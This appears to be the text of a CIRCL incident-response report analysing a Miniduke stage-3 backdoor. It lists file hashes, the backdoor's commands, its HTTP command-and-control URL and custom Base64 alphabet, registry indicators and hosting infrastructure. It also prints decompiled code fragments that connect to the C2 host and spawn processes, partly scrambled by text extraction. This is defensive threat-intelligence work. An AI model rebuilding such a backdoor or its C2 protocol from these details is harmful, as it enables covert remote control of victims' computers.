@@ -1,0 +1,867 @@
+Analysis Report (TLP:WHITE)
+
+Analysis of a stage 3 Miniduke sample
+
+Conducted by CIRCL - Computer Incident Response Center Luxembourg
+
+May 30, 2013, with an update on Jul 03, 2014
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+Contents
+1 Scope of work
+
+2 Analyzed samples
+
+2.1 Limitations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+2.2 Sharing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+3 Executive summary
+
+4 Analysis
+
+4.1 Summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4.2 Techniques used . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Implemented commands . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4.3
+4.4 Control
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+IOC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4.5
+4.5.1 Network . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4.5.2 Registry . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4.6 Persistency . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+4.7 Execution process . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+5 Interesting code parts
+
+5.1
+Init phase of Sample B . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+5.2 Decrypt and setup registry keys . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+evaluate commands (extract) and error handling . . . . . . . . . . . . . . . . . .
+5.3
+5.4
+Internet connect
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+5.5 Create process calls . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+6 Related indicators information
+
+6.1 Network infrastructure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+3
+
+3
+4
+4
+
+4
+
+4
+4
+4
+4
+5
+5
+5
+6
+6
+6
+
+8
+8
+8
+9
+9
+10
+
+10
+10
+
+Page 2 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+1 Scope of work
+In the scope of targeted attacks with a malware labeled as Miniduke by Kaspersky Labs, CIRCL
+was interested in the way the malware’s later stages work and what kind of interesting information
+they reveal (e.g. techniques, style, IOCs) . No public analysis was found except the mention in
+Kaspersky’s report of a custom backdoor, so CIRCL took one of the known samples and started
+this analysis.
+
+2 Analyzed samples
+
+• Sample A - Stage 3 sample from Kaspersky reports
+
+– Description
+
+* Hash found in Kaspersky Lab report 1
+
+– Original ﬁlename
+
+* v1.ex_
+
+– Hashes
+
+* MD5: 1e1b0d16a16cf5c7f3a7c053ce78f515
+* SHA1: de8e9def2553f4d211cc0b34a3972d9814f156aa
+* SHA-256: a1015f0b99106ae2852d740f366e15c1d5c711f57680a2f04be0283e8310f69e
+
+– Filesize
+
+* 333824 Bytes (326KB)
+
+– Compile time
+
+* Mon Jun 18 16:28:11 2012
+
+• Sample B - Derrived from Sample A
+
+– Description
+
+* Dumped memory region 0x0D060169 to 0x0d08b000 after de-obfuscation and
+
+UCL decompression 2
+
+– Original ﬁlename
+
+* Extracted from memory, no ﬁlename
+
+– Hashes
+
+* MD5: 1a2edd2db71fd41e963011da8caf26cc
+* SHA1: f344becb220de6ﬀa4d7223bdb82146d3b1c93ed
+* SHA-256: b61d409b6c1066e0c1fc4fe15f6f367be31fa2cc555cfc0ef7eeb8e5759380c0
+
+– Filesize
+
+* 175767 Bytes (172KB)
+
+– Compile time
+
+* Mon Mar 5 14:17:08 2012
+
+1http://www.securelist.com/en/downloads/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor.
+
+pdf
+
+2http://www.oberhumer.com/opensource/ucl/
+
+Page 3 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+2.1 Limitations
+This work has been done with utmost care, following best practices in software reversing, forensic
+investigations and/or information gathering. However, the work is only covering small aspects
+(based on the indicators given, lacking full context) and not an exhaustive analysis, and hence
+the report is as-is, not giving any guarantees of completeness or claiming absolute accuracy.
+
+2.2 Sharing
+The document is classiﬁed as TLP:WHITE, therefore CIRCL encourages everyone to share this
+analysis report as-is without modiﬁcation.
+
+3 Executive summary
+Sample B, contained in Sample A, can be categorized as an exhaustive backdoor, implementing
+any kind of functionality that can be expected for this kind of attacks. Despite the fact that it
+doesn’t implement any particular fancy or new technique, the code quality appears to be clean
+and robust, making rich use of C structures and logging and it shows on some places that it is
+targeting organizational infrastructures rather than home users.
+
+4 Analysis
+4.1 Summary
+Sample A can be categorized as a container, obfuscating and compressing the real payload.
+Sample A has been debugged until Sample B’s decompression ﬁnished. The memory segment
+was dumped to disk for further analysis. The focus of the analysis then shifted to Sample B.
+Sample B is identiﬁed to be a HTTP controlled backdoor, enabling the attacker to take full
+control over the victim computer.
+
+4.2 Techniques used
+The analysis has been done using a mixed-approach of dynamic analysis and static analysis
+in order to overcome some of the obfuscation and encryptions used by the malware. Some of
+the techniques might have also an impact on the interpretation of the malware. Unfortunately,
+when we started this investigation, the domain is now pointing to an IP address of Google and
+returning a 404 Not Found page only. An interaction following the protocol of this malware is
+therefore no longer possible.
+
+4.3 Implemented commands
+The analysis of Sample B revealed the commands as shown in table 1
+
+Page 4 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+mv
+cp
+rm
+pwd
+cd
+
+exew
+conf
+cdt
+dev
+time
+info
+exit
+dir/ls
+exec
+exeu
+put
+get
+
+rmdir
+mkdir
+
+pskill/kill
+
+pslist/ps
+
+Table 1: Implemented commands
+
+move a ﬁle
+copy a ﬁle
+delete a ﬁle
+get current directory
+change current directory
+delete directory
+create directory
+kill a process
+execute command
+show backdoor conﬁguration
+change to temp directory
+get a list of device drives
+get uptime of machine
+get path to the backdoor, computer name, username, process information
+exit
+get the content of a directory
+execute command interactively
+execute command interactively as speciﬁed domain user
+upload a ﬁle
+download a ﬁle
+get a list of running processes
+
+4.4 Control
+The attacker controls the remote computer via HTTP GET and POST requests like the following:
+1 * http : //news . grouptumbler .com/news/feed . php? i=Me3tMZEHAuvkc~uJsO~W7lX1vSsgkuW99vD3FRgi
+
+The request is encoded in a custom BASE64 encoding, using the following alphabet:
+
+1 * ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$~
+
+4.5 IOC
+4.5.1 Network
+The malware connects via HTTP GET and POST requests to
+
+1 * http : //news . grouptumbler .com/
+
+and the path is ﬁxed:
+1 * /news/ feed . php? i=
+
+The variable part is the custom BASE64 encoded string corresponding to ”i=”. A full request
+looks like:
+
+1 * http : //news . grouptumbler .com/news/feed . php? i={Custom BASE64}
+
+The user agent is always
+
+Page 5 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+1 * Mozilla /4.0
+
+Sent accept headers are:
+
+1 * Accept :
+
+*/*
+
+4.5.2 Registry
+The malware creates in
+
+1 * HKCU\Software\Microsoft\ApplicationManager
+
+a value ’AppID’ with the data it calculates from GetTickcount(), used as an identiﬁer/mutex.
+
+4.6 Persistency
+No persistency mechanisms have been identiﬁed. We assume the ﬁle is only dropped and/or
+executed on request via stage 2 of Miniduke and not running persistently.
+
+4.7 Execution process
+
+Sample A.
+
+..
+.
+.
+
+UCL decompression
+
+Sample B
+
+Sample B execution
+
+Update on Jul 03 2014: F-Secure released an analysis3 of the latest MiniDuke evolution, called
+”CosmicDuke”, mentioning similar loaders in old and new samples. That’s why we updated this
+document to include a graph of the loader:
+
+3http://www.f-secure.com/static/doc/labs_global/Whitepapers/cosmicduke_whitepaper.pdf
+
+Page 6 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+Page 7 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+5 Interesting code parts
+5.1 Init phase of Sample B
+Decryption of module and function names
+
+lpProcName) ;
+
+lpProcName) ;
+
+( hModule )
+
+lpProcName) ;
+
+wininet . d l l = decrypt_string(&enc_wininet_dll ) ;
+hModule = LoadLibraryA( wininet . d l l ) ;
+i f
+{
+
+1 int decode_functions_and_start_internet_loop ()
+2 {
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30 }
+
+lpProcName = decrypt_string(&enc_InternetOpenA) ;
+InternetOpenA = GetProcAddress (hModule ,
+lpProcName = decrypt_string ( enc_InternetConnectA ) ;
+InternetConnectA = GetProcAddress (hModule ,
+lpProcName = decrypt_string(&enc_InternetSetOptionA ) ;
+InternetSetOptionA = GetProcAddress (hModule ,
+lpProcName = decrypt_string(&enc_HttpOpenRequestA) ;
+HttpOpenRequestA = GetProcAddress (hModule ,
+lpProcName = decrypt_string(&enc_HttpSendRequestA) ;
+HttpSendRequestA = GetProcAddress (hModule ,
+lpProcName = decrypt_string(&enc_HttpQueryInfoA) ;
+HttpQueryInfoA = GetProcAddress (hModule ,
+lpProcName = decrypt_string(&enc_InternetReadFile ) ;
+InternetReadFile = GetProcAddress (hModule ,
+lpProcName) ;
+lpProcName = decrypt_string(&enc_InternetCloseHandle ) ;
+InternetCloseHandle = GetProcAddress (hModule ,
+port = parse_int ( ”80” ) ;
+delay = parse_int ( ”61” ) ;
+generate_identifier_and_setup_jumptable(&instance ) ;
+internet_loop(&instance ) ;
+ExitThread (0) ;
+
+}
+return 0;
+
+lpProcName) ;
+
+lpProcName) ;
+
+lpProcName) ;
+
+lpProcName) ;
+
+5.2 Decrypt and setup registry keys
+
+1 decrypt_registry_keys_and_set_id ()
+2 {
+3
+4
+
+r e s u l t = 0;
+str_Software_Microsoft_ApplicationManager = decrypt_string(&
+
+enc_Software_Microsoft_ApplicationManager ) ;
+( RegCreateKeyA(HKEY_CURRENT_USER, str_Software_Microsoft_ApplicationManager , &
+hKey) )
+
+i f
+
+{
+
+}
+else
+{
+
+re s u l t = 0;
+
+5
+
+6
+7
+8
+9
+10
+11
+12
+13
+14
+
+15
+16
+17
+
+dwType = 4;
+cbData = 4;
+str_AppID = decrypt_string(&enc_AppID) ;
+i f
+
+( (RegQueryValueExA(hKey, str_AppID , 0 , &dwType, &result , &cbData)
+4)
+
+| | dwType !=
+
+&& (dwType = 4 ,
+
+r e s u l t = get_tickcount_based_value () ,
+RegSetValueExA(hKey, str_AppID , 0 , dwType, &result , 4u) ) )
+
+Page 8 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+else
+
+RegCloseKey(hKey) ;
+
+RegCloseKey(hKey) ;
+
+}
+return re s u l t ;
+
+18
+19
+20
+21
+22
+23 }
+
+5.3 evaluate commands (extract) and error handling
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+
+i f
+{
+
+}
+
+! lstrcmpA(&this(cid:0)>command, ”pwd” ) )
+
+(
+ret(cid:0)>return = (cid:0)127;
+i f
+{
+
+! GetCurrentDirectoryA (0x400u , &ret(cid:0)>message ) )
+
+(
+this(cid:0)>command = GetLastError () ;
+FormatMessageA(0x1000u , 0 , this(cid:0)>command, 0 , &ret(cid:0)>message , 0x400u , 0) ;
+
+}
+ret(cid:0)>len += lstrlenA(&ret(cid:0)>message ) + 1;
+
+5.4 Internet connect
+
+internet_connect ( struct_this_7 *this )
+
+else
+
+!= ’* ’
+
+buffer = 10000;
+i f
+
+1 signed int __thiscall
+2 {
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+
+( this(cid:0)>hInternetOpen )
+i f
+{
+
+| | url [ 1 ]
+
+( url [ 0 ]
+lstrcpyA(&host , ”news . grouptumbler .com” ) ;
+wnsprintfA(&host , 256 , ”%x%s” , *&this(cid:0)>path , 0x409001 ) ;
+
+!= ’ . ’ )
+
+use_proxy = 0;
+buffer = 3;
+this(cid:0)>hInternetOpen = InternetOpenA ( ” Mozilla /4.0 ” , 0 , 0 , 0 , 0) ;
+i f
+{
+
+( use_proxy )
+success_setoption = InternetSetOptionA ( this(cid:0)>hInternetOpen , INTERNET_OPTION_PROXY
+i f
+{
+
+, &buffer , 12) ;
+! success_setoption )
+
+(
+InternetCloseHandle ( this(cid:0)>hInternetOpen ) ;
+return 0;
+
+4) ;
+
+4) ;
+
+}
+InternetSetOptionA ( this(cid:0)>hInternetOpen , INTERNET_OPTION_CONNECT_TIMEOUT, &buffer ,
+InternetSetOptionA ( this(cid:0)>hInternetOpen , INTERNET_OPTION_RECEIVE_TIMEOUT, &buffer ,
+success_setoption = InternetSetOptionA ( this(cid:0)>hInternetOpen ,
+LOWORD( success_setoption ) = port ;
+this(cid:0)>hSession = InternetConnectA ( this(cid:0)>hInternetOpen , &host ,
+i f
+InternetCloseHandle ( this(cid:0)>hInternetOpen ) ;
+
+INTERNET_OPTION_CONTROL_SEND_TIMEOUT, &buffer , 4) ;
+
+( this(cid:0)>hSession )
+return 1;
+
+0 , INTERNET_SERVICE_HTTP, 0 , 0) ;
+
+success_setoption , 0 ,
+
+}
+
+16
+17
+18
+19
+20
+21
+22
+
+23
+
+24
+
+25
+26
+
+27
+28
+29
+30
+
+}
+
+Page 9 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+return 0;
+
+31
+32 }
+
+5.5 Create process calls
+Command ”exec” - standard process creation:
+
+1 hProcess = CreateProcessA (
+0 , &this(cid:0)>cmdline , 0 , 0 ,
+2
+3
+1 , 0x14u , 0 , 0 ,
+&this(cid:0)>startupinfo_a , &this(cid:0)>process_information )
+4
+Command ”exeu” - process creation in a domain environment
+
+1
+2
+3
+4
+
+hProcess = CreateProcessWithLogonW(
+&Username , &Domain,
+lpPassword , 0 ,
+0 , &CommandLine, 4u , 0 , &CurrentDirectory ,
+&this(cid:0)>startupinfo_b , &this(cid:0)>process_information )
+
+6 Related indicators information
+6.1 Network infrastructure
+The domain news.grouptumbler.com is currently resolving to 173.194.70.101
+
+seen 2013(cid:0)03(cid:0)03 01:57:37 (cid:0)0000
+seen 2013(cid:0)03(cid:0)06 23:34:47 (cid:0)0000
+
+1 f i r s t
+2 l a s t
+3 news . grouptumbler .com. A 173.194.70.101
+Before that date, the IP was 200.63.46.33
+
+seen 2012(cid:0)03(cid:0)14 14:21:10 (cid:0)0000
+1 f i r s t
+seen 2013(cid:0)02(cid:0)26 22:04:07 (cid:0)0000
+2 l a s t
+3 news . grouptumbler .com. A 200.63.46.23
+
+The IP 200.63.46.33 was hosting the following domains:
+
+1 dvdform .com. A 200.63.46.23
+2 www. dvdform .com. A 200.63.46.23
+3 www. p90xprice .com. A 200.63.46.23
+4 dexterseason .com. A 200.63.46.23
+5 www. dexterseason .com. A 200.63.46.23
+6 news . grouptumbler .com. A 200.63.46.23
+7 www. babylearningdvd .com. A 200.63.46.23
+8 turbofirecoupon .com. A 200.63.46.23
+9 www. turbofirecoupon .com. A 200.63.46.23
+10 smallvilledvdset .com. A 200.63.46.23
+11 www. smallvilledvdset .com. A 200.63.46.23
+12 miamivicedvdboxset .com. A 200.63.46.23
+13 www. miamivicedvdboxset .com. A 200.63.46.23
+14 www. sexandthecityondvd .com. A 200.63.46.23
+15 www. sherlockholmesondvd .com. A 200.63.46.23
+16 t r x f o r c e k i t o r i g i n a l .com. A 200.63.46.23
+17 www. t r x f o r c e k i t o r i g i n a l .com. A 200.63.46.23
+18 weddingdressestoday .com. A 200.63.46.23
+19 www. maxheadroomdvdseries .com. A 200.63.46.23
+
+Page 10 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+None, some or all domains in this list might be malicious as well.
+
+The IP address 200.63.46.33 is currently anounced by Panamaserver.com
+
+1 20120426 20130311 52284 200.63.46.0/24 (cid:0)
+2 http : //bgpranking . c i r c l . lu /asn_details?asn=52284&source=&date=
+
+The hosting company is not a known bulletproof hoster based on the BGP Ranking informa-
+
+tion4.
+
+and was announced by two other ISPs before:
+
+1 20110118 20120425 23520 200.63.46.0/24 (cid:0) Columbus network
+2 20090601 20110117 27716 200.63.46.0/24 (cid:0) Advanced Communication Network , S .A.
+
+WHOIS Panamaserver.com
+
+1 inetnum : 200.63.40/21
+2 status : allocated
+3 aut(cid:0)num: N/A
+4 owner : Panamaserver .com
+5 ownerid : PA(cid:0)PANA2(cid:0)LACNIC
+6 responsible : Ch Group Corp .
+7 address : Bella Vista , El cangrejo , Calle 49 , 0 ,
+8 address : 00000 (cid:0) Panama (cid:0)
+9 country : PA
+10 phone : +507 263 3723 [ ]
+11 owner(cid:0)c : MAC30
+12 tech(cid:0)c : MAC30
+13 abuse(cid:0)c : MAC30
+14 inetrev : 200.63.46/24
+15 nserver : NS1.PANAMASERVER.COM
+
+4http://bgpranking.circl.lu/asn_details?date=2012-12-08;asn=52284
+
+Page 11 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+CIRCL - Computer Incident Response Center Luxembourg
+
+July 3, 2014
+July 3, 2014
+July 3, 2014
+
+16 nsstat : 20130311 AA
+17 nslastaa : 20130311
+18 created : 20080328
+19 changed : 20080328
+20
+21 nic(cid:0)hdl : MAC30
+22 person : Manuel I . Cabrera Ch.
+23 e(cid:0)mail : ABUSE@PANAMASERVER.COM
+24 address : Bella Vista Calle 39A y Ave Cuba, 0 ,
+25 address : 0000 (cid:0) Panama (cid:0) PA
+26 country : PA
+27 phone : +507 8322443 [ ]
+28 created : 20071004
+29 changed : 20120311
+
+Page 12 of 12
+
+CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+
+
